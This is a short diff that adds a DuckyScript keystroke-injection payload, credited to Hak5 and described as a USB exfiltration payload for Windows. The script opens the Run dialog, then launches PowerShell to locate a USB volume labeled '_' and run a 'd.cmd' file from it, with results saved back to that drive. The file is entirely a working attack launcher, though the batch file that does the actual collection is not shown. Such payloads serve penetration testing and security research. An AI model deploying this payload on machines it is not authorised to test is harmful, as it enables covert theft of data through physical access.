@@ -1,0 +1,8 @@
+REM USB Exfiltration Payload from Hak5 episodes 2112 - 2114
+REM Target: Windows XP SP3+ Author: Hak5Darren Props: Diggster, Midnightsnake
+Rem This wil look for the drive named "_" and save the report there
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell ".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')"
+ENTER
